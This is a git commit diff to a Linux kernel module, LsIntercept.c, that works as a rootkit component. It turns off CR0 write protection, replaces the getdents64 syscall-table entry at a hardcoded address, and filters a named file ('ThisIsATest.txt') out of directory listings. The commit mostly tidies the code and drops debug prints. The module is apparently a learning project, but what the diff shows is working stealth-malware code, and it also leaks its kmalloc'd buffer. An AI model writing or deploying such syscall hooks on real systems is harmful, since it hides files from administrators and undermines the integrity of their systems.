a992f97731ec3401aef4220170c9510885212fda
Yonatan Cohen <yonatanco404@gmail.com>
2025-01-20 19:48:56 +0200

    preetified code

--- stage2/LsIntercept.c
+++ stage2/LsIntercept.c
@@ -3,48 +3,16 @@
 #include <asm/cacheflush.h>
 #include <linux/uaccess.h>
 #include <linux/slab.h>
- 
+#include <stdbool.h>
+
+// Function headers. 
 int load(void);
 void unload(void);
 
-struct pt_regs_x86 {
-/*
- * C ABI says these regs are callee-preserved. They aren't saved on kernel entry
- * unless syscall needs a complete, fully filled "struct pt_regs".
- */
-	unsigned long r15;
-	unsigned long r14;
-	unsigned long r13;
-	unsigned long r12;
-	unsigned long rbp;
-	unsigned long rbx;
-/* These regs are callee-clobbered. Always saved on kernel entry. */
-	unsigned long r11;
-	unsigned long r10;
-	unsigned long r9;
-	unsigned long r8;
-	unsigned long rax;
-	unsigned long rcx;
-	unsigned long rdx;
-	unsigned long rsi;
-	unsigned long rdi;
-/*
- * On syscall entry, this is syscall#. On CPU exception, this is error code.
- * On hw interrupt, it's IRQ number:
- */
-	unsigned long orig_rax;
-/* Return frame for iretq */
-	unsigned long rip;
-	unsigned long cs;
-	unsigned long eflags;
-	unsigned long rsp;
-	unsigned long ss;
-/* top of stack page */
-};
-
-typedef asmlinkage int (*original_getdents64_t)(const struct pt_regs_x86 *regs);
-static unsigned long *syscall_table = (unsigned long *)0xffffffff8cc001a0; 
+// Types & other consts.
+typedef int (*original_getdents64_t)(const struct pt_regs *regs);
 static original_getdents64_t original_getdents64_ptr;
+static unsigned long *syscall_table = (unsigned long *)0xffffffffafe001a0; 
 static char *file_name_to_hide = "ThisIsATest.txt";
  
 static inline void wp_cr0(unsigned long val) {
@@ -61,40 +29,35 @@ static inline void one_cr0(void) {
     wp_cr0(read_cr0() | 0x10000);
 }
 
-asmlinkage int new_getdents64(const struct pt_regs_x86 *regs) {
-    int total_bytes_read = (int)original_getdents64_ptr(regs);
-    struct linux_dirent64 *buff = (struct linux_dirent64*)((char*)regs->rsi);
+int new_getdents64(const struct pt_regs *regs) {
+    int total_bytes_read = original_getdents64_ptr(regs);
+    struct linux_dirent64 *buff = (struct linux_dirent64*)regs->si;
 
     // Can be one or more, doesn't really matter so long as it's triggered.
     int has_been_found = 0;
-    char *first;
-    if (total_bytes_read > 0) {
-        printk(KERN_ALERT "Total bytes read: %d", total_bytes_read);
-        printk(KERN_ALERT "Buffer pointer: %p", buff);
+    void *first;
 
+    if (total_bytes_read > 0) {
         first = kmalloc(total_bytes_read, GFP_KERNEL);
 
-        int copy_res;
-        copy_res = copy_from_user((void *)first, buff, (unsigned long)total_bytes_read);
+        int copy_res = copy_from_user((void *)first, buff, (unsigned long)total_bytes_read);
         if (copy_res) {
             printk(KERN_ALERT "Error while copying from user space! error %d", copy_res);
             return total_bytes_read;
         }
 
-        struct linux_dirent64 * curr;
-        curr = (struct linux_dirent64*)(first);
+        struct linux_dirent64 * curr = first;
 
-        size_t i = 0;
+        int i = 0;
         while ((i < total_bytes_read) && (curr->d_reclen > 0)) {   
-            curr = (struct linux_dirent64*)(first + i);
+            curr = first + i;
 
             char *name = curr->d_name;
-            printk(KERN_ALERT "Original: %p. Index: %ld, Name: \"%s\" Current pointer: %p has length: %d", first, i, name, curr, curr->d_reclen);
             if (!strcmp(name, file_name_to_hide)) {
                 has_been_found += 1;
                 // File matches name to hide, we need to delete it from the array.
-                printk(KERN_ALERT "FOUND YOU!");
                 int length_to_copy = total_bytes_read - i - curr->d_reclen;
+
                 // Array has been shortened by the length of the member we've just deleted.
                 total_bytes_read -= curr->d_reclen;
                 printk(KERN_ALERT "Total bytes read after delete: %d", total_bytes_read);
@@ -109,7 +72,7 @@ asmlinkage int new_getdents64(const struct pt_regs_x86 *regs) {
     }
 
     if (has_been_found) {
-        copy_to_user(buff, (void*)first, total_bytes_read);
+        copy_to_user((void*)buff, (void*)first, total_bytes_read);
     }
 
     return total_bytes_read;
@@ -119,8 +82,7 @@ int load(void) {
     printk(KERN_ALERT "Initializing...");
     zero_cr0();
     original_getdents64_ptr = (original_getdents64_t)syscall_table[__NR_getdents64];
-    printk(KERN_ALERT "%p OWP", original_getdents64_ptr);
-    syscall_table[__NR_getdents64] = (unsigned long)new_getdents64;
+    syscall_table[__NR_getdents64] = (long unsigned int)new_getdents64;
     printk(KERN_ALERT "Overrided getdents64 ptr!");
     one_cr0();
     printk(KERN_ALERT "Initialized successfuly!");
@@ -131,7 +93,7 @@ int load(void) {
 void unload(void) {
     printk(KERN_ALERT "Shutting down.");
     zero_cr0();
-    syscall_table[__NR_getdents64] = (unsigned long)original_getdents64_ptr;  
+    syscall_table[__NR_getdents64] = (long unsigned int)original_getdents64_ptr;  
     one_cr0();
     printk(KERN_ALERT "Goodbye world...");
 }
